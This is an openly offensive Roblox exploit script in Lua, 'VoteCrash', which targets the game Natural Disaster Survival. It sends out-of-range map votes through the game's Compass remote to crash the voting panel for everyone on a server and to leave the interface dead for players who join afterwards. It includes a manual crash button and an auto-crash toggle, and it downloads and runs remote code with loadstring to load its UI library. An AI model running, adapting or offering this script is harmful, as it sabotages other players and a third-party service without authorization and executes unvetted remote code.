--[[
        VoteCrash - Natural Disaster Survival map-vote crasher
        repo: Toluwerr/Scripts-
        target: Natural Disaster Survival (placeId 189707) - hard-gated, no-op anywhere else

        The bug (verified in the decompiled client, Core root component):
        every client buckets the Compass map votes into exactly 3 arrays with
        table.insert(buckets[vote.Value], ...) and runs that same code inside
        the root React effect at mount, with no error boundary anywhere in the
        game. Votes travel through ReplicatedStorage.Remotes.Compass:
        FireServer("Vote Map", n) and the server keeps them as
        "State Replicators".Compass.<UserId> NumberValues. Any stored value
        outside 1-3 nil-indexes the bucket table: the vote panel freezes for
        everyone in the server, and any player who JOINS while the poisoned
        vote exists gets their entire UI unmounted at mount (no Ready button,
        no disaster warnings, no health bar) until the server clears the vote
        state.

        Server scripts never replicate, so unclamped storage cannot be proven
        statically - every fire is verified live against the replicated vote
        child and the real result is reported, success or not.
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local PLACE_ID = 189707
local POISON_OPTIONS = { "1.5", "0", "-1", "4", "1e9" }

local LocalPlayer = Players.LocalPlayer
local Global = (getgenv and getgenv()) or _G

if type(Global.__VoteCrashCleanup) == "function" then
        pcall(Global.__VoteCrashCleanup)
end

local Reborn
do
        local ok, library = pcall(function()
                return loadstring(game:HttpGet(
                        "https://raw.githubusercontent.com/Toluwer/Reborn/main/src/Reborn.luau"
                ))()
        end)

        if not ok or type(library) ~= "table" or type(library.CreateWindow) ~= "function" then
                warn("[VoteCrash] Failed to load the Reborn UI library.")
                return
        end

        Reborn = library
end

local Window
local statusLabel

local function notify(title, description)
        pcall(function()
                Window:Notify({
                        Title = tostring(title),
                        Description = tostring(description or ""),
                        Duration = 5,
                })
        end)
end

-- =============================================================
-- Settings / state
-- =============================================================

local CrashSettings = {
        Auto = false,
        Value = 1.5, -- legit votes are 1/2/3; 1.5 also slips through naive 1..3 range checks
}

local connections = {}
local lastFire = 0

local compassRemote
local compassState

-- =============================================================
-- Server state helpers
-- =============================================================

local function myVoteChild()
        if not compassState then
                return nil
        end
        return compassState:FindFirstChild(tostring(LocalPlayer.UserId))
end

local function poisonStored(value)
        local child = myVoteChild()
        return child ~= nil and child.Value == value
end

local function voteWindowOpen()
        if not compassState then
                return false
        end
        if compassState:GetAttribute("Enabled") == true then
                return true
        end
        return #compassState:GetChildren() > 0
end

local function statusText()
        if not compassState then
                return "Compass state not found."
        end
        local mine = myVoteChild()
        local mineText = "none"
        if mine then
                local tag = "clean"
                if mine.Value ~= 1 and mine.Value ~= 2 and mine.Value ~= 3 then
                        tag = "poison"
                end
                mineText = tostring(mine.Value) .. " (" .. tag .. ")"
        end
        return string.format(
                "Vote window: %s | votes stored: %d | my vote: %s | choices: %s",
                voteWindowOpen() and "open" or "closed",
                #compassState:GetChildren(),
                mineText,
                compassState:GetAttribute("Choices") or "-"
        )
end

local function refreshStatus()
        if statusLabel then
                pcall(function()
                        statusLabel:Set(statusText())
                end)
        end
end

-- =============================================================
-- Fire + verify
-- =============================================================

local function firePoison()
        local value = CrashSettings.Value
        compassRemote:FireServer("Vote Map", value)
        return value
end

local function verifyPoison(value, source)
        task.spawn(function()
                local deadline = os.clock() + 5
                local child = nil
                while os.clock() < deadline do
                        child = myVoteChild()
                        if child and child.Value == value then
                                break
                        end
                        task.wait(0.25)
                end
                if child and child.Value == value then
                        notify("VoteCrash", string.format(
                                "Poison vote stored (Value = %s, %s). The vote panel is now frozen for everyone in the server, and anyone who joins until the vote state resets gets a fully dead UI.",
                                tostring(value),
                                source
                        ))
                else
                        local current = "no vote child exists"
                        if child then
                                current = "stored value = " .. tostring(child.Value)
                        end
                        notify("VoteCrash", string.format(
                                "Server did not keep the poison vote (%s, %s). It was clamped or ignored - possibly patched, or no vote window was open.",
                                current,
                                source
                        ))
                end
                refreshStatus()
        end)
end

local function autoTrigger(source)
        if not CrashSettings.Auto then
                return
        end
        if poisonStored(CrashSettings.Value) then
                return
        end
        local now = os.clock()
        if now - lastFire < 2 then
                return
        end
        lastFire = now
        verifyPoison(firePoison(), source)
end

-- =============================================================
-- Hard game gate
-- =============================================================

if game.PlaceId ~= PLACE_ID then
        Window = Reborn:CreateWindow({
                Title = "VoteCrash",
                Size = Vector2.new(560, 300),
        })
        local GateTab = Window:Tab("Status", "zap")
        local GateSection = GateTab:Section("Wrong Game")
        GateSection:Paragraph({
                Text = "VoteCrash targets Natural Disaster Survival (placeId 189707). " ..
                        "You are in placeId " .. tostring(game.PlaceId) .. " - nothing to do here.",
        })
        Global.__VoteCrashCleanup = function()
                pcall(function()
                        Window:Destroy()
                end)
                Global.__VoteCrashCleanup = nil
        end
        warn("[VoteCrash] Wrong game: placeId " .. tostring(game.PlaceId))
        return
end

-- =============================================================
-- Resolve the game structure (slow replication tolerant)
-- =============================================================

do
        local remotesFolder = ReplicatedStorage:WaitForChild("Remotes", 10)
        local stateFolder = ReplicatedStorage:WaitForChild("State Replicators", 10)
        if remotesFolder then
                compassRemote = remotesFolder:WaitForChild("Compass", 5)
        end
        if stateFolder then
                compassState = stateFolder:WaitForChild("Compass", 5)
        end
end

if not compassRemote
        or not compassRemote:IsA("RemoteEvent")
        or not compassState
        or not compassState:IsA("Folder")
then
        Window = Reborn:CreateWindow({
                Title = "VoteCrash",
                Size = Vector2.new(560, 300),
        })
        local GateTab = Window:Tab("Status", "zap")
        local GateSection = GateTab:Section("Game Updated?")
        GateSection:Paragraph({
                Text = "Expected ReplicatedStorage.Remotes.Compass (RemoteEvent) and " ..
                        "ReplicatedStorage.State Replicators.Compass (Folder) but did not find them. " ..
                        "The game structure may have changed - nothing was fired.",
        })
        Global.__VoteCrashCleanup = function()
                pcall(function()
                        Window:Destroy()
                end)
                Global.__VoteCrashCleanup = nil
        end
        warn("[VoteCrash] Compass remote/state not found - aborting without firing.")
        return
end

-- =============================================================
-- Watchers
-- =============================================================

table.insert(connections, compassState.ChildAdded:Connect(function()
        autoTrigger("vote child added")
        task.delay(0.1, refreshStatus)
end))

table.insert(connections, compassState.ChildRemoved:Connect(function()
        refreshStatus()
end))

table.insert(connections, compassState:GetAttributeChangedSignal("Enabled"):Connect(function()
        if compassState:GetAttribute("Enabled") == true then
                autoTrigger("vote window opened")
        end
        refreshStatus()
end))

-- =============================================================
-- UI
-- =============================================================

Window = Reborn:CreateWindow({
        Title = "VoteCrash",
        Size = Vector2.new(620, 460),
})

local CrashTab = Window:Tab("Crash", "zap")

local PoisonSection = CrashTab:Section("Poison Vote")

PoisonSection:Dropdown({
        Text = "Poison Value",
        Options = POISON_OPTIONS,
        Value = "1.5",
        Callback = function(value)
                local n = tonumber(value)
                if n then
                        CrashSettings.Value = n
                end
        end,
})

PoisonSection:Paragraph({
        Text = "Legit votes are 1, 2 or 3. 1.5 still misses the 3 vote buckets while slipping through naive " ..
                "1..3 range checks; 0 / -1 / 4 / 1e9 cover floor-style validation. Every value is verified " ..
                "against the replicated vote child after firing.",
})

PoisonSection:Button({
        Text = "Crash Server (fire poison vote)",
        Primary = true,
        Callback = function()
                verifyPoison(firePoison(), "manual")
        end,
})

PoisonSection:Toggle({
        Text = "Auto-Crash Every Vote Window",
        Value = false,
        Callback = function(value)
                CrashSettings.Auto = value and true or false
                if CrashSettings.Auto then
                        task.defer(function()
                                autoTrigger("auto enabled")
                        end)
                end
        end,
})

local StatusSection = CrashTab:Section("Server State")

statusLabel = StatusSection:Paragraph({
        Text = statusText(),
})

local CleanupSection = CrashTab:Section("Cleanup")

CleanupSection:Button({
        Text = "Remove My Vote (un-poison)",
        Callback = function()
                compassRemote:FireServer("Remove Vote")
                task.spawn(function()
                        local deadline = os.clock() + 5
                        while os.clock() < deadline do
                                if not myVoteChild() then
                                        notify("VoteCrash", "Vote removed - new joiners get their UI back on their next mount.")
                                        refreshStatus()
                                        return
                                end
                                task.wait(0.25)
                        end
                        notify("VoteCrash", "Vote child is still present - the server may not honor Remove Vote.")
                end)
        end,
})

CleanupSection:Paragraph({
        Text = "Sends the game's own 'Remove Vote' action so the server drops your poisoned vote child. " ..
                "Turn Auto-Crash off first - while it is on, the next vote event re-poisons.",
})

local InfoSection = CrashTab:Section("How It Works")

InfoSection:Paragraph({
        Text = "Every client buckets Compass votes into exactly 3 arrays with table.insert(bucket[vote.Value]) " ..
                "and re-runs that code in the root UI effect at mount. A stored vote outside 1-3 nil-indexes " ..
                "the bucket table; with no error boundary, the entire UI tree unmounts.",
})

InfoSection:Paragraph({
        Text = "Effect: the vote panel freezes for everyone in the server, and anyone who JOINS while the " ..
                "poison vote exists gets a dead UI (no Ready button, no disaster warnings, no health bar) " ..
                "until the server clears the vote state. Your own vote panel freezes too - rejoin to restore it.",
})

InfoSection:Paragraph({
        Text = "Server code never replicates, so storage cannot be proven statically. Every fire is verified " ..
                "against your replicated vote child and the real outcome is reported - no fake success.",
})

-- =============================================================
-- Cleanup
-- =============================================================

local function cleanup()
        for _, connection in pairs(connections) do
                pcall(function()
                        connection:Disconnect()
                end)
        end

        pcall(function()
                Window:Destroy()
        end)

        Global.__VoteCrashCleanup = nil
end

Global.__VoteCrashCleanup = cleanup
